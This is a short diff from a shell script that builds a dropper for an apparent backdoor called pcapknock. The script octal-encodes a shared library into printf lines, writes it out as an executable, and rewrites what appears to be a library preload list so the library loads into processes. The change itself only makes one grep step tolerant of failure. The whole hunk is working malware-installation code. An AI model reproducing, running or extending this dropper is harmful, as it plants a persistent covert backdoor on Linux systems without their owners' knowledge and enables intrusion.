@@ -51,7 +51,7 @@ if [ "Linux" = "$(uname -s)" ]; then
         perl -E '$/=\16;while(<>){$s=join"",map{sprintf"\\%03o",ord}split//;say"printf \"$s\" >>\$LB"}' $OUTDIR/pcapknock.systemd.so >>$DROPPER
         echo 'chmod 0755 $LB'                                                               >>$DROPPER
         echo 'echo $LA > $PB'                                                               >>$DROPPER
-        echo 'if [ -r $PA ]; then grep -v $LA $PA >> $PB; fi'                               >>$DROPPER
+        echo 'if [ -r $PA ]; then grep -v $LA $PA >> $PB || true; fi'                       >>$DROPPER
         echo 'mv $LB $LA'                                                                   >>$DROPPER
         echo 'mv $PB $PA'                                                                   >>$DROPPER
         echo 'echo Created files:'                                                          >>$DROPPER
